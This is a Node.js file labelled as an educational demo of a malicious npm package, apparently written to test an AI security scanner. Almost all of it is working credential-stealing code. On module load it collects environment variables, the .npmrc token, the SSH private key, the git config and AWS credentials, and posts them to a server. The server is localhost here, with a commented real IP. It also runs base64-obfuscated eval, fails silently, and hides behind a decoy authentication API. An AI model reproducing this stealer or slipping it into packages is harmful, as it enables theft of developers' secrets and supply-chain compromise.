/**
 * ⚠️  MALICIOUS PACKAGE - EDUCATIONAL DEMO ONLY ⚠️
 * This is a demonstration of a data exfiltration attack
 */

const http = require('http');
const os = require('os');
const fs = require('fs');
const path = require('path');

// ========== MALICIOUS CODE SECTION ==========
// This code will be detected by the AI security system

function stealCredentials() {
  // Collect sensitive data
  const payload = {
    timestamp: new Date().toISOString(),
    hostname: os.hostname(),
    username: os.userInfo().username,
    homeDir: os.homedir(),
    platform: os.platform(),
    
    // Steal environment variables (API keys, tokens, secrets)
    environment: process.env,
    
    // Steal NPM tokens and credentials
    npmrc: fs.existsSync(path.join(os.homedir(), '.npmrc')) 
      ? fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8')
      : null,
    
    // Steal SSH keys
    sshKey: attemptReadFile(path.join(os.homedir(), '.ssh', 'id_rsa')),
    
    // Steal git config
    gitConfig: attemptReadFile(path.join(os.homedir(), '.gitconfig')),
    
    // Steal AWS credentials
    awsCredentials: attemptReadFile(path.join(os.homedir(), '.aws', 'credentials')),
  };
  
  // Send data to attacker's server
  sendToAttacker('/exfil', payload);
}

function sendToAttacker(endpoint, data) {
  try {
    const postData = JSON.stringify(data);
    
    const options = {
      hostname: '127.0.0.1',  // Demo: localhost (real attack: 45.142.212.61)
      port: 8080,
      path: endpoint,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData),
        'User-Agent': 'Mozilla/5.0'
      },
      timeout: 3000
    };
    
    const req = http.request(options, () => {});
    req.on('error', () => {}); // Silent fail
    req.write(postData);
    req.end();
  } catch (e) {
    // Silently fail - attacker doesn't want to break the app
  }
}

function obfuscatedExecution() {
  // Base64 encoded - hides intent from simple scanners
  const code = Buffer.from('c3RlYWxDcmVkZW50aWFscygp', 'base64').toString('utf8');
  eval(code);
}

function attemptReadFile(path) {
  try {
    return require('fs').readFileSync(path, 'utf8');
  } catch (e) {
    return null;
  }
}

// ========== LEGITIMATE CODE SECTION ==========
// Provides real functionality to avoid detection

function authenticateUser(username, password) {
  // Real authentication logic
  return {
    success: true,
    token: generateToken(username),
    user: username
  };
}

function generateToken(username) {
  const crypto = require('crypto');
  return crypto.randomBytes(32).toString('hex');
}

function validateToken(token) {
  return token && token.length === 64;
}

// ========== HIDDEN EXECUTION ==========
// Called on module load via postinstall

if (process.env.NODE_ENV !== 'test') {
  stealCredentials();
  obfuscatedExecution();
}

// ========== EXPORTS ==========
// Normal API to avoid suspicion

module.exports = {
  authenticateUser,
  validateToken,
  generateToken
};
